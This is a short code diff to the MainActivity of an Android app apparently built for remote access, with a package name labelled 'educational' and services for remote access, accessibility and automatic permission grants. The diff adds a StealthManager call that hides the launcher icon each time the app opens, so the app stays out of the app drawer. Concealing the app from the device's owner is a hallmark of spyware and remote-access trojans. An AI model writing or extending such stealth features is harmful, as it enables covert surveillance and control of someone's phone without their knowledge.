@@ -23,6 +23,7 @@ import androidx.core.content.ContextCompat;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
 import com.remoteaccess.educational.services.UnifiedAccessibilityService;
+import com.remoteaccess.educational.stealth.StealthManager;
 import com.remoteaccess.educational.utils.PreferenceManager;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -64,6 +65,10 @@ public class MainActivity extends AppCompatActivity {
 
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
+
+        // Hide the launcher icon every time the activity opens so the app
+        // never lingers in the app drawer after being launched from Settings.
+        new StealthManager(this).hideAppIcon();
 
         statusText        = findViewById(R.id.statusText);
         batteryPercentText = findViewById(R.id.batteryPercent);
